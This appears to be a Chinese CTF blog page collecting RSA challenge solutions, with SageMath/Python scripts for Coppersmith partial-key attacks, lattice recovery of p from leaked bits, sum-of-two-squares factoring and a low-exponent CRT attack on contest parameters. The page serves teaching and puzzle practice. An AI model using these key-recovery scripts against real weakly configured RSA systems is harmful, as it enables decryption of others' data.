# e = 0x10001 # N = pow(p, 2) + pow(q, 2) # m = bytes_to_long(flag) # c = pow(m,e,n) # # print(c) # print(N) from Crypto.Util.number import * c = 34992437145329058006346797890363070594973075282993832268508442432592383794878795192132088668900695623924153165395583430068203662437982480669703879475321408183026259569199414707773374072930515794134567251046302713509056391105776219609788157691337060835717732824405538669820477381441348146561989805141829340641 N = 14131431108308143454435007577716000559419205062698618708133959457011972529354493686093109431184291126255192573090925119389094648901918393503865225710648658 p,q=two_squares(N) n = p * pow(q, 3) e = 0x10001 phi = (p - 1) * (pow(q, 3) - pow(q, 2)) d = inverse(e, phi) m = pow(c, d, n) print(long_to_bytes(m)) Coppersmith 已知m的高位，求m n=10934282759418716864083387149400358148885247110933867252983794425632302624483291838978054379912661191455027376539730843211768681711588034738804296785076819 c=199928678441564572513071545433948014294972061145992950128884609861283198064457810780158231851803305318741555460032075238932950496972965422017125 (m\u0026gt;\u0026gt;72)\u0026lt;\u0026lt;72=584734024210391580014049648429032467639773954048 e=3 在$Zmod(n)$下，有$m^3-c \\equiv 0 \\rightarrow (m_{high}+x)^3-c\\equiv 0$\nexp:\nfrom Crypto.Util.number import * def phase2(high_m, n, c): R.\u0026lt;x\u0026gt; = PolynomialRing(Zmod(n), implementation=\u0026#39;NTL\u0026#39;) m = high_m + x M = m((m^3 - c).small_roots()[0]) return M n = 10934282759418716864083387149400358148885247110933867252983794425632302624483291838978054379912661191455027376539730843211768681711588034738804296785076819 c = 199928678441564572513071545433948014294972061145992950128884609861283198064457810780158231851803305318741555460032075238932950496972965422017125 high_m = 584734024210391580014049648429032467639773954048 M=phase2(high_m, n, c) print(long_to_bytes(int(M))) flag{this_is_a_flag}\n已知p的高位，求m n = 22251179507951667208988404735324990388496950479821651652239579051045817986824945842987389922759437945557559748313907295712994332924679954306619009079508267870910149223565520196385455171091011721532290110253401719887456896015127869765120008086727571060297059461651083340986173237394309195529977693665449059967337557768799655172974710341929078477027816362721220950313898766868468203962782247110726810571421671360963619837700834009507913757260784147014841481557088215597539779565493898663380798904766007590175316989637076522379230279938065198199833033309266088268398369881039750675835382713087914092008694800853680890199 c = 13791076590876280345965238373786427523823675722374540431144373789735114060078921115309660269509771288228144711168452947459244770278987545774287579571059845423259662466243727180866431665100157413245622442955953683599217851246153754699865188329020209657227990460455369896960050383820265224545863644175721361758413632638638545353172694886999221882770404353366722168355187142789778530832186215934690392286482192890311329246011772739859918291556448869621490688586398693159275264761107488552610343215662469995425523594866854716852872141401095283180173839653418794273521904566990987307557028155209305585359720312859989634334 (p\u0026gt;\u0026gt;128)\u0026lt;\u0026lt;128 = 150840505999598161819551431768821975459467574249752039047846845481249241887784911457438773307473629946085877682693884024926228559996574370474982369597013808808768450992113314638371133051992554697609546180277873202687064844984114775286878743211353292718680724328420518679703560272767696234210910831061812379648 exp:\nfrom Crypto.Util.number import * def phase3(high_p, n, c): R.\u0026lt;x\u0026gt; = PolynomialRing(Zmod(n), implementation=\u0026#39;NTL\u0026#39;) p = high_p + x x0 = p.small_roots(X = 2^128, beta = 0.1,epsilon=0.02)[0] P = int(p(x0)) Q = n // P assert n == P*Q d = inverse_mod(65537, (P-1)*(Q-1)) #print(power_mod(c, d, n)) return power_mod(c,d,n) n = 22251179507951667208988404735324990388496950479821651652239579051045817986824945842987389922759437945557559748313907295712994332924679954306619009079508267870910149223565520196385455171091011721532290110253401719887456896015127869765120008086727571060297059461651083340986173237394309195529977693665449059967337557768799655172974710341929078477027816362721220950313898766868468203962782247110726810571421671360963619837700834009507913757260784147014841481557088215597539779565493898663380798904766007590175316989637076522379230279938065198199833033309266088268398369881039750675835382713087914092008694800853680890199 c = 13791076590876280345965238373786427523823675722374540431144373789735114060078921115309660269509771288228144711168452947459244770278987545774287579571059845423259662466243727180866431665100157413245622442955953683599217851246153754699865188329020209657227990460455369896960050383820265224545863644175721361758413632638638545353172694886999221882770404353366722168355187142789778530832186215934690392286482192890311329246011772739859918291556448869621490688586398693159275264761107488552610343215662469995425523594866854716852872141401095283180173839653418794273521904566990987307557028155209305585359720312859989634334 high_p = 150840505999598161819551431768821975459467574249752039047846845481249241887784911457438773307473629946085877682693884024926228559996574370474982369597013808808768450992113314638371133051992554697609546180277873202687064844984114775286878743211353292718680724328420518679703560272767696234210910831061812379648 M=phase3(high_p, n, c) print(M) print(long_to_bytes(M)) 已知p的若干中间位 from Crypto.Util.number import * flag = b\u0026#39;?\u0026#39; e = 65537 p, q = getPrime(1024), getPrime(1024) N = p * q gift = p\u0026amp;(2**923-2**101) m = bytes_to_long(flag) c = pow(m, e, N) print(\u0026#34;N = \u0026#34;,N) print(\u0026#34;gift = \u0026#34;,gift) print(\u0026#34;c = \u0026#34;,c) \u0026#34;\u0026#34;\u0026#34; N = 12055968471523053394851394038007091122809367392467691213651520944038861796011063965460456285088011754895260428814358599592032865236006733879843493164411907032292051539754520574395252298997379020268868972160297893871261713263196092380416876697472160104980015554834798949155917292189278888914003846758687215559958506116359394743135211950575060201887025032694825084104792059271584351889134811543088404952977137809673880602946974798597506721906751835019855063462460686036567578835477249909061675845157443679947730585880392110482301750827802213877643649659069945187353987713717145709188790427572582689339643628659515017749 p0 = 70561167908564543355630347620333350122607189772353278860674786406663564556557177660954135010748189302104288155939269204559421198595262277064601483770331017282701354382190472661583444774920297367889959312517009682740631673940840597651219956142053575328811350770919852725338374144 c = 2475592349689790551418951263467994503430959303317734266333382586608208775837696436139830443942890900333873206031844146782184712381952753718848109663188245101226538043101790881285270927795075893680615586053680077455901334861085349972222680322067952811365366282026756737185263105621695146050695385626656638309577087933457566501579308954739543321367741463532413790712419879733217017821099916866490928476372772542254929459218259301608413811969763001504245717637231198848196348656878611788843380115493744125520080930068318479606464623896240289381601711908759450672519228864487153103141218567551083147171385920693325876018 \u0026#34;\u0026#34;\u0026#34; exp：\nN = 12055968471523053394851394038007091122809367392467691213651520944038861796011063965460456285088011754895260428814358599592032865236006733879843493164411907032292051539754520574395252298997379020268868972160297893871261713263196092380416876697472160104980015554834798949155917292189278888914003846758687215559958506116359394743135211950575060201887025032694825084104792059271584351889134811543088404952977137809673880602946974798597506721906751835019855063462460686036567578835477249909061675845157443679947730585880392110482301750827802213877643649659069945187353987713717145709188790427572582689339643628659515017749 p0 = 70561167908564543355630347620333350122607189772353278860674786406663564556557177660954135010748189302104288155939269204559421198595262277064601483770331017282701354382190472661583444774920297367889959312517009682740631673940840597651219956142053575328811350770919852725338374144 c = 2475592349689790551418951263467994503430959303317734266333382586608208775837696436139830443942890900333873206031844146782184712381952753718848109663188245101226538043101790881285270927795075893680615586053680077455901334861085349972222680322067952811365366282026756737185263105621695146050695385626656638309577087933457566501579308954739543321367741463532413790712419879733217017821099916866490928476372772542254929459218259301608413811969763001504245717637231198848196348656878611788843380115493744125520080930068318479606464623896240289381601711908759450672519228864487153103141218567551083147171385920693325876018 def bivariate(pol, XX, YY, kk=4): N = pol.parent().characteristic() f = pol.change_ring(ZZ) PR, (x, y) = f.parent().objgens() idx = [(k - i, i) for k in range(kk + 1) for i in range(k + 1)] monomials = list(map(lambda t: PR(x ** t[0] * y ** t[1]), idx)) # collect the shift-polynomials g = [] for h, i in idx: if h == 0: g.append(y ** h * x ** i * N) else: g.append(y ** (h - 1) * x ** i * f) # construct lattice basis M = Matrix(ZZ, len(g)) for row in range(M.nrows()): for col in range(M.ncols()): h, i = idx[col] M[row, col] = g[row][h, i] * XX ** h * YY ** i # LLL B = M.LLL() PX = PolynomialRing(ZZ, \u0026#39;xs\u0026#39;) xs = PX.gen() PY = PolynomialRing(ZZ, \u0026#39;ys\u0026#39;) ys = PY.gen() # Transform LLL-reduced vectors to polynomials H = [(i, PR(0)) for i in range(B.nrows())] H = dict(H) for i in range(B.nrows()): for j in range(B.ncols()): H[i] += PR((monomials[j] * B[i, j]) / monomials[j](XX, YY)) # Find the root poly1 = H[0].resultant(H[1], y).subs(x=xs) poly2 = H[0].resultant(H[2], y).subs(x=xs) poly = gcd(poly1, poly2) x_root = poly.roots()[0][0] poly1 = H[0].resultant(H[1], x).subs(y=ys) poly2 = H[0].resultant(H[2], x).subs(y=ys) poly = gcd(poly1, poly2) y_root = poly.roots()[0][0] return x_root, y_root PR = PolynomialRing(Zmod(N), names=\u0026#39;x,y\u0026#39;) x, y = PR.gens() pol = 2 ** 923 * x + y + p0 x, y = bivariate(pol, 2 ** 101, 2 ** 101) p = 2 ** 923 * x + y + p0 q = N // p print(p) print(q) phi=(p-1)*(q-1) e=65537 d=inverse(e,phi) m=pow(c,d,N) print(long_to_bytes(int(m))) ","permalink":"https://smera1d0.github.io/posts/ctf-rsa-%E5%90%88%E9%9B%86/","summary":"\u003ch2 id=\"e很小时\"\u003ee很小时：\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003egmpy2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kn\"\u003efrom\u003c/span\u003e \u003cspan class=\"nn\"\u003efunctools\u003c/span\u003e \u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"n\"\u003ereduce\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kn\"\u003efrom\u003c/span\u003e \u003cspan class=\"nn\"\u003eCrypto.Util.number\u003c/span\u003e \u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"n\"\u003elong_to_bytes\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eCRT\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eitems\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003eN\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ereduce\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003elambda\u003c/span\u003e \u003cspan class=\"n\"\u003ex\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ey\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"n\"\u003ex\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"n\"\u003ey\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"n\"\u003ei\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"n\"\u003eitems\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003eresult\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"n\"\u003ea\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003en\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"n\"\u003eitems\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"n\"\u003em\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eN\u003c/span\u003e \u003cspan class=\"o\"\u003e//\u003c/span\u003e \u003cspan class=\"n\"\u003en\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"n\"\u003ed\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003es\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003egmpy2\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003egcdext\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003en\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003em\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"n\"\u003ed\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"k\"\u003eraise\u003c/span\u003e \u003cspan class=\"ne\"\u003eException\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Input not pairwise co-prime\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"n\"\u003eresult\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"n\"\u003ea\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"n\"\u003es\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"n\"\u003em\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003eresult\u003c/span\u003e \u003cspan class=\"o\"\u003e%\u003c/span\u003e \u003cspan class=\"n\"\u003eN\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eN\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# e, n, c\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003ee\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mh\"\u003e0x3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003en\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mh\"\u003e0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003ec\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mh\"\u003e0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003edata\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003elist\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003ezip\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ec\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003en\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003ex\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003en\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eCRT\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003em\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003egmpy2\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eiroot\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003egmpy2\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003empz\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ex\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"n\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e)[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003edigits\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eprint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003em\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eprint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003elong_to_bytes\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003eint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003em\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003edecode\u003c/span\u003e\u003cspan class=\"p\"\u003e())\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"解形如x2modpequiv-r的同余方程\"\u003e解形如$x^2(modp)\\equiv r$的同余方程\u003c/h2\u003e\n\u003ch3 id=\"vn2020-公开赛-easy_rsa\"\u003e\u003cstrong\u003eV\u0026amp;N2020 公开赛 easy_RSA\u003c/strong\u003e\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kn\"\u003efrom\u003c/span\u003e \u003cspan class=\"nn\"\u003erandom\u003c/span\u003e \u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"n\"\u003erandint\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kn\"\u003efrom\u003c/span\u003e \u003cspan class=\"nn\"\u003egmpy2\u003c/span\u003e \u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kn\"\u003efrom\u003c/span\u003e \u003cspan class=\"nn\"\u003eCrypto.Util.number\u003c/span\u003e \u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003egetprime\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ebits\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003ewhile\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"n\"\u003en\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003ewhile\u003c/span\u003e \u003cspan class=\"n\"\u003en\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ebit_length\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"n\"\u003ebits\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"n\"\u003en\u003c/span\u003e \u003cspan class=\"o\"\u003e*=\u003c/span\u003e \u003cspan class=\"n\"\u003enext_prime\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003erandint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e1000\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"n\"\u003eisPrime\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003en\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003en\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003em\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ebytes_to_long\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"sa\"\u003eb\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;flag{************************************}\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003ep\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003egetprime\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e505\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003eq\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003egetPrime\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e512\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003er\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003egetPrime\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e512\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eassert\u003c/span\u003e \u003cspan class=\"n\"\u003em\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"n\"\u003eq\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003en\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ep\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"n\"\u003eq\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"n\"\u003er\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003ee\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mh\"\u003e0x10001\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003ed\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003einvert\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan 